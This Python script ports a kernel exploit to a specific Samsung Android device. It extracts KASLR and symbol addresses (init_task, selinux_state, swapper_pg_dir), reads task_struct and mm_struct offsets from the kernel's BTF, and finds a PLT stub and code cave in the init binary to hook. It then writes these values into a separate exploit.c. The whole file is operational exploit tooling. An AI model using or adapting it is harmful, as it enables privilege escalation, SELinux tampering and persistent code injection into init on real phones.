# Pull this device's offsets out of firmware and patch src/exploit.c.
# Drop boot.img, kallsyms.txt, init in the cwd, then:  ./port_extract.py
# Needs readelf + pahole.
import re, struct, subprocess, sys
from pathlib import Path

arg = sys.argv[1:]
boot     = arg[0] if len(arg) > 0 else "boot.img"
kallsyms = arg[1] if len(arg) > 1 else "kallsyms.txt"
init     = arg[2] if len(arg) > 2 else "init"
exploit  = arg[3] if len(arg) > 3 else str(Path(__file__).resolve().parent / "exploit.c")

defines = {}

# kernel Image lives inside boot.img (boot hdr v3/v4: kernel_size at 8, kernel at 0x1000)
img = Path(boot).read_bytes()
kernel = img[0x1000:0x1000 + struct.unpack_from("<I", img, 8)[0]]

# symbol addresses
sym = {}
for line in Path(kallsyms).read_text(errors="replace").splitlines():
    col = line.split()
    if len(col) >= 3:
        sym[col[2]] = int(col[0], 16)

# KASLR symbols + signature (first 6 words of _stext)
# Some kallsyms extractors drop the address on _stext/_text; fall back to _text+0x10000,
# else the lowest symbol address (== kernel text start == _stext).
stext = sym.get("_stext") or (sym["_text"] + 0x10000 if "_text" in sym else min(sym.values()))
base  = sym.get("_text", stext - 0x10000)        # _text is the kernel base; 0x10000 is the usual gap
words = list(struct.unpack_from("<6I", kernel, stext - base))
defines.update({
    "FW_STEXT_VA":             f"0x{stext:x}ULL",
    "FW_SWAPPER_PG_DIR_VA":    f"0x{sym['swapper_pg_dir']:x}ULL",
    "FW_INIT_TASK_VA":         f"0x{sym['init_task']:x}ULL",
    "FW_SELINUX_STATE_VA":     f"0x{sym['selinux_state']:x}ULL",
    "SAMSUNG_LINEAR_MAP_BASE": f"0x{base:x}ULL",
    "SAMSUNG_STEXT_OFFSET":    f"0x{stext - base:x}",
})
# FW_STEXT_SIG1/SIG2 are derived in-code from FW_STEXT_WORDS (patched below).

# struct offsets from the kernel's embedded BTF
btf = kernel.find(b"\x9f\xeb\x01\x00")
hdr, _, _, str_off, str_len = struct.unpack_from("<IIIII", kernel, btf + 4)
Path("kernel.btf").write_bytes(kernel[btf:btf + hdr + str_off + str_len])

def member(struct_name, field):
    out = subprocess.run(["pahole", "-C", struct_name, "kernel.btf"], capture_output=True, text=True).stdout
    for line in out.splitlines():
        m = re.search(r"\b(\w+);\s*/\*\s*(\d+)\s", line)
        if m and m.group(1) == field:
            return int(m.group(2))
    sys.exit(f"{struct_name}.{field} not in BTF")

for macro, (struct_name, field) in {
    "OFFSETOF_TASK_STRUCT_TASKS": ("task_struct", "tasks"),
    "OFFSETOF_TASK_STRUCT_MM":    ("task_struct", "mm"),
    "OFFSETOF_TASK_STRUCT_PID":   ("task_struct", "pid"),
    "OFFSETOF_MM_PGD":            ("mm_struct", "pgd"),
    "OFFSETOF_MM_START_CODE":     ("mm_struct", "start_code"),
    "OFFSETOF_MM_END_CODE":       ("mm_struct", "end_code"),
}.items():
    defines[macro] = f"0x{member(struct_name, field):x}"

# init-hook: exec segment, the __system_property_update@plt stub, and the trailing cave
def readelf(flag):
    return subprocess.run(["readelf", flag, init], capture_output=True, text=True).stdout

for line in readelf("-lW").splitlines():
    m = re.search(r"LOAD\s+0x(\w+)\s+0x(\w+)\s+0x\w+\s+0x(\w+)\s+0x\w+\s+R E", line)
    if m:
        seg_off, text_va, seg_size = (int(g, 16) for g in m.groups())
        break
else:
    sys.exit("no executable LOAD segment in init")

got = next(int(l.split()[0], 16) for l in readelf("-rW").splitlines() if "__system_property_update" in l)
ldr = 0xF9400000 | (((got & 0xFFF) // 8) << 10) | (16 << 5) | 17   # ldr x17, [x16, #got_lo]
code = Path(init).read_bytes()[seg_off:seg_off + seg_size]
for pos in range(0, len(code) - 16, 4):
    w = struct.unpack_from("<4I", code, pos)                       # adrp x16 / ldr x17 / add x16 / br x17
    if w[1] == ldr and w[3] == 0xD61F0220 and (w[0] & 0x9F000000) == 0x90000000 and (w[0] & 0x1F) == 16:
        break
else:
    sys.exit("__system_property_update@plt stub not found")

defines["INIT_TEXT_FILE_VA"]       = f"0x{text_va:x}ULL"
defines["INIT_HOOK_PATCH_FILE_VA"] = f"0x{text_va + pos:x}ULL"
defines["INIT_HOOK_CAVE_FILE_VA"]  = f"0x{text_va + seg_size:x}ULL"   # zero pad after the exec segment
defines["INIT_HOOK_CAVE_EXPECT0"]  = "0x00000000U"
for i in range(4):
    defines[f"INIT_HOOK_PATCH_EXPECT{i}"] = f"0x{w[i]:08x}U"

# patch src/exploit.c
src = Path(exploit).read_text()
for name, value in defines.items():
    src, n = re.subn(rf"(#define\s+{name}\s+)\S+", rf"\g<1>{value}", src)
    if n != 1:
        sys.exit(f"{name}: patched {n} sites, expected 1")
rows = ",\n        ".join(", ".join(f"0x{x:08x}" for x in words[i:i + 3]) for i in (0, 3))
src, n = re.subn(r"(FW_STEXT_WORDS\[6\] = \{).*?(\};)",
                 lambda m: f"{m[1]}\n        {rows},\n    {m[2]}", src, flags=re.S)
if n != 1:
    sys.exit(f"FW_STEXT_WORDS: patched {n} sites, expected 1")
Path(exploit).write_text(src)

report = "\n".join(f"#define {k:28} {v}" for k, v in defines.items())
report += "\nFW_STEXT_WORDS[6] = " + ", ".join(f"0x{x:08x}" for x in words)
Path("offsets.txt").write_text(report + "\n")
print(report + f"\n\npatched {exploit}, wrote offsets.txt")
